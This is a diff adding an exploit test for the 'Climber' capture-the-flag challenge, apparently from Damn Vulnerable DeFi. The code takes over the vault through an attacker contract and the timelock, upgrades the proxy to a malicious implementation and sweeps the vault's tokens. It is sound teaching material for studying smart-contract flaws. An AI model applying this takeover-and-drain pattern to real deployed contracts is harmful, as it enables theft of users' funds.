@@ -53,6 +53,30 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        console.log(" ");
+        this.climbercracker = await (await ethers.getContractFactory("ClimberCracker", attacker)).deploy(
+            this.token.address,
+            this.vault.address,
+            this.timelock.address
+        )
+        console.log(`Old Vault Implementation: ${await upgrades.erc1967.getImplementationAddress(this.vault.address)}`)
+        console.log(`Before Attack. DVT Balance: ${ethers.utils.formatEther(await this.token.balanceOf(this.vault.address))}`)
+       
+        // In here we get the ownership of everything     
+        await this.climbercracker.connect(attacker).firstExecutionSet();
+            
+       console.log(" ");
+
+        // Because we are now the owners, we can upgrade the contract.
+        const VaultV2 = await ethers.getContractFactory("CrackerNewImpl", attacker);
+        this.vaultV2 = await upgrades.upgradeProxy(this.vault.address, VaultV2);
+        console.log(`New Vault Implementation: ${await upgrades.erc1967.getImplementationAddress(this.vault.address)}`)
+        
+        // Rekt.
+        await this.vaultV2.connect(attacker).sweepFunds(this.token.address);
+
+        console.log(`After Attack. DVT Balance: ${ethers.utils.formatEther(await this.token.balanceOf(this.vault.address))}`)
+        console.log(" ");
     });
 
     after(async function () {
